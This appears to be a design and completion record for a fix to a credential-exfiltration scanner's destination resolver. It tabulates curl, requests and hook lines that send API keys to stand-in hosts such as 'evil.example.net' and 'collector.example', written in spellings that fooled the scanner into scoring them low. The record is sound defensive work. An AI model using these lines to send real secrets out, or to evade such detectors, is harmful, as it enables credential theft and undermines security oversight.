<!-- SPDX-License-Identifier: MIT -->
# 143 — A key sent to `${API}@evil.net` or `API + ".evil.net"` is reported low: a base URL that ends at its host vouches for whatever the line appends to it

- **Source**: new finding (2026-11-20), while writing the adversarial files for P-142's trials; the maintainer, the same
  day ("要" to: fix it, and record it once fixed)
- **Depends on**: P-061 (the one-level resolution of a destination variable, which this corrects); P-128 (the command
  half of `HOOK-003` reads the same resolver)
- **Branch**: `p/143-reference-extends-the-host`

## Problem

P-061 resolves a destination written as a variable one level inside the file: `API=https://api.deepl.com` above,
`curl "$API/v2/translate"` below, and the request is read as going to `api.deepl.com`. When that host is the
credential's own service, `EXFIL-001` drops from high to a low advisory. P-061 said that "a reference followed by a
host-extending character (`${API}.evil.net`) is not resolved", and built exactly that case: a `.` straight after a
`$NAME` or `{NAME}` reference.

Every other way of carrying the host on is resolved, and the literal then vouches for a host it does not spell.
Measured on `main` at `c96baf7` (rules `64f57c6f747c`), one skill per row, `DEEPL_API_KEY` or `GITHUB_TOKEN` read in
the same file:

| the line that sends | what is contacted | `EXFIL-001` on `main` |
|---|---|---|
| `curl … "${API}/v2/translate"` | `api.deepl.com` | low (right) |
| `curl … "${API}.evil.example.net/collect"` | `api.deepl.com.evil.example.net` | high (P-061's case) |
| `curl … "${API}-edge.example.net/collect"` | `api.deepl.com-edge.example.net` | **low** |
| `curl … "${API}evil.example.net/collect"` | `api.deepl.comevil.example.net` | **low** |
| `curl … "${API}@collect.example.net/x"` | `collect.example.net` (the base is the userinfo) | **low** |
| `curl … "$API@collect.example.net/x"` | the same | **low** |
| `curl … "${API}${SUFFIX}"`, `SUFFIX=.evil.example.net/collect` | `api.deepl.com.evil.example.net` | **low** |
| `requests.get(API + ".gh-mirror.example.net/repos", …)` | `api.github.com.gh-mirror.example.net` | **low** |
| `requests.get(API + SUFFIX, …)`, the same suffix in a name | the same | **low** |
| `requests.get(f"{API}-mirror.example.net/repos", …)` | `api.github.com-mirror.example.net` | **low** |

A low advisory does not gate: each of the eight scores 95/100 and passes `check`, the load-time gate and
`--fail-on high`. The file reads a named credential and sends it to a host its author chose.

The resolver has a second reader. `HOOK-003`'s command half (P-128) calls it to decide whether a hook's destination is
loopback, and a hook that posts its input to loopback is low. With `BASE=http://localhost` above, a hook script that
runs `curl -d @- "$BASE@collector.example/e"` or `"${BASE}-relay.collector.example/e"` is read as posting to this
machine: `HOOK-003` low, where the same destination written out is high.

No malicious sample in the corpus uses any of these spellings (the measurement below: no malicious finding moves).
This is a bypass found by reading the tool, as P-138 and P-139 were.

## Initial direction

The literal vouches for the host it spells and for no other. Two facts decide a reference, and the resolver reads
both:

1. **Whether the assigned URL ends at its host.** `https://api.deepl.com` (with or without a port) is *open*: what
   follows the name continues the authority. `https://api.deepl.com/v2` already holds a path, and nothing appended to
   a path reaches another host; a reference to it resolves as before, whatever follows.
2. **Whether the line ends the host of an open base.** It does at a path, a query or a fragment, at a port, at the
   end of the string or the line. It does not when name characters, a label, a hyphen, an `@`, a second reference, or
   — after the string closes — a concatenation with anything but a string that begins a path comes next. Then the
   reference is not resolved, the destination is unreadable, and the chain stays high: the direction P-061 fails in
   everywhere else.

One existing answer changes on purpose: `fetch(API + route)` with an open base and a name whose value the line does
not show. `route` is usually `"/v1/tools"`; it can as well be `".evil.net/x"`, and the rule cannot tell. It is no
longer resolved. The measurement below says what that costs.

`rulesEpoch` 26 → 27. No rule is added and no rule's text changes.

## Done criteria

Code:

- [x] `TestResolvedHosts_ABaseThatEndsAtItsHostVouchesOnlyForThatHost` (`internal/detect/destination_test.go`, new):
  14 ordinary uses of an open base still resolve; 14 spellings that carry the host on do not; 13 of them resolve
  again against a base that holds a path (the fourteenth is resolved by no spelling)
- [x] `TestChain_ACarriedOnHostIsNotTheServices` (new): five spellings stay `EXFIL-001` high through the engine; the
  ordinary use and a base with a path stay low
- [x] `TestHookPayloadEgress_Destination` gains three rows: a loopback base turned into userinfo and one carried on
  with a hyphen are `HOOK-003` high (**red on `main`**: both low), a loopback base with a path stays low
- [x] Reverse assertions, green without a character changed in what they assert: every other row of
  `TestChain_DestinationResolvesSameFileBaseURL` (the base-URL-at-the-top shapes P-061 was written for),
  `TestHostMatchesService`, `TestHookPayloadEgress_*`
- [x] One pinned row changes and says so: "a base concatenated with a route in the first argument" was low and is
  high (Initial direction); a twin with a path in the base is added and is low
- [x] `rulesEpoch` 27, `make docs` (no rule text changes; the rules version moves), `.claude/rules/detect.md`,
  `CHANGELOG.md`
- [x] `make verify` green, read from its own exit code

Measurement (static, free), `main` at `57ae417` (the 2026-11-19 runs; rules `64f57c6f747c`, as `c96baf7`) against
the branch (`agent-guard-work/runs/2026-11-20-p143-strict-*`). Lines written on 2026-11-20 before the branch runs
were read:

- [x] **Malicious, corpus (719)**: no sample loses a finding at high. Flagged 243 → at least 243. *243 → 243; no
  finding of any malicious sample differs.*
- [x] **Benign, corpus (4,534)**: at most **5** samples gain a high. *337 → 338: one.* A skill whose client sets
  `const API = (process.env.…_API_BASE || 'https://api.typesafe.ai').replace(/\/$/, '')` and calls
  `fetch(API + route, …)`: the shape Initial direction names, in the very file P-061's test row was written from. A
  second benign sample, already flagged, has one more file at high: a test that calls
  `` fetch(`${proxyUrl}${path}?test=1`) `` over a loopback base. No other finding of any benign sample differs.
- [x] **Fresh real skills (412)**: at most **2** trees gain a high. *0: no finding differs (24 of 200 and 9 of 212
  flagged, before and after).*
- [x] **Held-out, totals only**: malicious flagged not lower than 134 of 243; benign flagged at most 7 of 216.
  *134 and 6, as before.*
- [x] The eight rows of the Problem table that read low on `main` read high; the first row stays low. *Each row as a
  skill of its own, both binaries: 95/100 → 69/100 on the eight; the path-after-base row and a twelfth,
  `requests.get(API + "/repos/x/issues")`, stay low.*

## Out of scope

- **Which host is the service's** (`hostMatchesService`): P-144.
- **Spellings the resolver never resolved** and so never vouched: `"%s.evil.net" % API`, `"{}".format(API)`,
  `urljoin`, a method call on the name. They are unreadable today and stay high.
- **A suffix that reaches the line through a parameter of another file.** One file, one level, as P-061.
- **The judge's helpers** that replay the chain (`CredentialGoesHome`, `CredentialSentElsewhere`): they call the
  same resolver and move with it; nothing of theirs is changed here, and no judge reading is claimed.

## Must not claim

- Not "the destination check cannot be spoofed". It reads one file and one level; a host under another top-level
  domain that carries the service's name exactly still matches (P-144 narrows which label may, not which TLD).
- No benchmark number improves. What is shown is the table of spellings and the absence, or the size, of a cost.
- `fetch(API + route)` over an open base is now unreadable: say so wherever the resolver is described, since P-061's
  own example list included it.

## Work items

| W | In one sentence | Commit message (no sha; a rebase changes it) |
|---|---|---|
| 1 | The resolver reads whether the base ends at its host and whether the line ends it; tests | `detect: a base URL that ends at its host vouches only for that host (P-143)` |
| 2 | `rulesEpoch` 27, `docs/rules.md`, `.claude/rules/detect.md`, `CHANGELOG.md` | `detect: rules epoch 27 for the host a reference is carried into (P-143)` |
| 3 | Runs, readings into this file | `proposals: P-143 measured (P-143)` |
| 4 | Done, the index, `complete/` | `proposals: P-143 done (P-143)` |

## Open questions

1. **`API + name` over a base that ends at its host.** Recommended: **not resolved** (as built). The alternative
   keeps resolving it unless the file assigns that name a string that does not begin a path, which closes the
   same-file case and leaves a suffix passed as an argument. The measurement decides: if the benign line holds with
   the strict reading, it stays.
   **Proceeded under the recommendation (2026-11-20)**: the line holds, at one benign skill of 4,534 and none of
   412 fresh ones.
   **Decided (2026-11-20)**: as recommended ("按你建议的来").
2. **A base that holds a path resolves whatever follows.** Recommended: **yes.** `https://api.github.com/v3` followed
   by anything is a longer path on the same host.
   **Decided (2026-11-20)**: as recommended.

## Done

```
Merged: PR #170 (2026-11-20; find the sha with git log --grep P-143 after the merge)
Released: v0.39.0
Evidence: TestResolvedHosts_ABaseThatEndsAtItsHostVouchesOnlyForThatHost (internal/detect/destination_test.go): over API=https://api.deepl.com, 14 ordinary uses resolve (a path, a query, a port, the end of the string, API + "/v2") and 14 spellings that carry the host on do not (.evil.net, -mirror.evil.net, evil.net, @evil.net, :x@evil.net, ${API}${SUFFIX}, {API}{suffix}, API + ".evil.net", API + suffix, a template then + ".evil.net"); 13 of the 14 resolve again over a base with a path
Evidence: TestChain_ACarriedOnHostIsNotTheServices: five spellings EXFIL-001 high through the engine; the path-after-base use and a base with a path low
Evidence: TestHookPayloadEgress_Destination, three rows added: a loopback base turned into userinfo and one carried on with a hyphen are HOOK-003 high (both low on main, run against main's resolver); a loopback base with a path low
Evidence: the Problem table as eleven one-skill fixtures, main 57ae417 against the branch: the eight low rows 95/100 → 69/100 (EXFIL-001 low → high); "${API}/v2/translate" and API + "/repos/x/issues" low on both; the dot row high on both
Evidence: static, main 57ae417 → branch: corpus malicious 243 → 243 of 719 with no finding of any malicious sample changed; benign 337 → 338 of 4,534 (one skill, fetch(API + route) over 'https://api.typesafe.ai'; one already-flagged server gains a high on a test file, `${proxyUrl}${path}` over a loopback base); hard negatives 4 → 4; fresh skills 24 of 200 and 9 of 212, no finding changed; held-out, totals only, malicious 134 of 243 and benign 6 of 216, unchanged
Evidence: reverse assertions green: every other row of TestChain_DestinationResolvesSameFileBaseURL, TestHostMatchesService, TestHookPayloadEgress_*; the one pinned row that changes (a base that ends at its host, concatenated with a name: low → high) says so, and its twin with a path in the base is low
Evidence: rulesEpoch 27; docs/rules.md regenerated (the rules version only); make verify: all gates passed; CI build-test and changelog pass on the PR
```
